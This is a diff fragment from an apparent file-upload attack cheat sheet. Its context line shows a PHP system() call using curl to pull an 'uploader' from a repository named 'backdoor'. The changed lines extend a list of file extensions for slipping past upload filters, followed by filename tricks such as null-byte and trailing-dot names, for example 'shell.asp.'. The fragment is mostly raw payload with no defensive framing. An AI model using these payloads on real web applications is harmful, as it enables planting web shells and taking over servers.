@@ -14,7 +14,7 @@ system('curl https://raw.githubusercontent.com/kontolodon7/backdoor/main/uploade
 ```
 # Extension Bypass
 ```
-php2.php3.php4.php5.php6.php7.phps.phps.pht.phtm.phtml.pgif.shtml.htaccess.phar.inc.hphp.ctp.module.asp.aspx.config.ashx.asmx.aspq.axd.cshtm.cshtml.rem.soap.vbhtm.vbhtml.asa.cer
+php2.php3.php4.php5.php6.php7.phps.phps.pht.phtm.phtml.pgif.shtml.htaccess.phar.inc.hphp.ctp.module.asp.aspx.config.ashx.asmx.aspq.axd.cshtm.cshtml.rem.soap.vbhtm.vbhtml.asa.cer.inc.suspected
 file.p.phpp file.php.php file.php%00.jpg
 file.php%00.jpg file.txt.jpg.png.asp
 file.asp\ shell.asp.\
